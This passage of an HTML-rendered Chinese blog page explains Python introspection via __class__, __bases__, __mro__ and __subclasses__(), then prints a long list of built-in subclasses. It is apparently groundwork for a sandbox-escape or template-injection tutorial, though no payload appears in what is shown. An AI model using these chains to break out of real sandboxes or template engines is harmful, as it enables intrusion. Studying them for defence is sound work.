punctuation">.</span>__bases__ <span class="token comment">#列出所有的基类，返回的是元组类型</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">,</span><span class="token punctuation">)</span>变量<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment">#可以使用数组方法返回第一个基类</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__     <span class="token comment">#它会显示类和基类，这是它和__bases__的不同,同样也可以使用数组方法</span><span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="subclasses"><a href="#subclasses" class="headerlink" title="subclasses()"></a><strong>subclasses</strong>()</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>查看当前类的子类，格式变量<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#返回的是列表类型</span>这个类也可以加数组来查看指定的索引值，例如变量<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'type'</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'type'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'async_generator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'int'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bytearray_iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bytearray'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bytes_iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bytes'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'builtin_function_or_method'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'callable_iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'PyCapsule'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'cell'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'classmethod_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'classmethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'code'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'complex'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'coroutine'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_items'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_itemiterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_keyiterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_valueiterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_keys'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'mappingproxy'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_reverseitemiterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_reversekeyiterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_reversevalueiterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_values'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ellipsis'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'enumerate'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'float'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'frame'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'frozenset'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'function'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'generator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'getset_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'instancemethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'list_iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'list_reverseiterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'list'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'longrange_iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'member_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'memoryview'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'method_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'method'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'moduledef'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'module'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'odict_iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'pickle.PickleBuffer'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'property'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'range_iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'range'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'reversed'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'symtable entry'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'set_iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'set'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'slice'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'staticmethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'stderrprinter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'super'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'traceback'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'tuple_iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'tuple'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str_iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'wrapper_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'types.GenericAlias'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'anext_awaitable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'async_generator_asend'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'async_generator_athrow'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'async_generator_wrapped_value'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'coroutine_wrapper'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'InterpreterID'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'managedbuffer'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'method-wrapper'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'types.SimpleNamespace'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'NoneType'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'NotImplementedType'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'weakcallableproxy'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'weakproxy'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'weakref'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'types.UnionType'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'EncodingMap'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'fieldnameiterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'formatteriterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BaseException'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'hamt'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'hamt_array_node'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'hamt_bitmap_node'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'hamt_collision_node'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'keys'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'values'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'items'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_contextvars.Context'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_contextvars.ContextVar'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_contextvars.Token'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'Token.MISSING'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'filter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'map'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'zip'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib._ModuleLock'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib._DummyModuleLock'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib._ModuleLockManager'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib.ModuleSpec'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib.BuiltinImporter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib.FrozenImporter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib._ImportLockContext'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_thread.lock'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_thread.RLock'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_thread._localdummy'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_thread._local'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_io._IOBase'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_io._BytesIOBuffer'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_io.IncrementalNewlineDecoder'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'nt.ScandirIterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'nt.DirEntry'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'PyHKEY'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib_external.WindowsRegistryFinder'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib_external._LoaderBasics'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib_external.FileLoader'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib_external._NamespacePath'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib_external._NamespaceLoader'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib_external.PathFinder'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib_external.FileFinder'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.Codec'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalEncoder'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalDecoder'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.StreamReaderWriter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.StreamRecoder'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abc._abc_data'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'abc.ABC'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'collections.abc.Hashable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'collections.abc.Awaitable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'collections.abc.AsyncIterable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'collections.abc.Iterable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'collections.abc.Sized'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'collections.abc.Container'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'collections.abc.Callable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'os._wrap_close'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'os._AddedDllDirectory'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_sitebuiltins.Quitter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_sitebuiltins._Printer'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_sitebuiltins._Helper'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_multibytecodec.MultibyteCodec'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_multibytecodec.MultibyteIncrementalEncoder'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_multibytecodec.MultibyteIncrementalDecoder'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_multibytecodec.MultibyteStreamReader'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_multibytecodec.MultibyteStreamWriter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'types.DynamicClassAttribute'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'types._GeneratorWrapper'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.WarningMessage'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.catch_warnings'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'importlib._abc.Loader'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.accumulate'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.combinations'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.combinations_with_replacement'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.cycle'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.dropwhile'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.takewhile'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.islice'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.starmap'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.chain'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.compress'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.filterfalse'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.count'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.zip_longest'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.pairwise'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.permutations'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.product'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.repeat'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.groupby'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools._grouper'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools._tee'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools._tee_dataobject'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'operator.attrgetter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'operator.itemgetter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'operator.methodcaller'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'operator.attrgetter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'operator.itemgetter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'operator.methodcaller'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'reprlib.Repr'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'collections.deque'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_collections._deque_iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_collections._deque_reverse_iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_collections._tuplegetter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'collections._Link'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'functools.partial'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'functools._lru_cache_wrapper'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'functools.KeyWrapper'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'functools._lru_list_elem'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'functools.partial'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'functools.partialmethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'functools.singledispatchmethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'functools.cached_property'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'contextlib.ContextDecorator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'contextlib.AsyncContextDecorator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'contextlib._GeneratorContextManagerBase'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'contextlib._BaseExitStack'</span><span class="token operator">></span><span class="token punctuation">]</span><span aria-hidden="true" 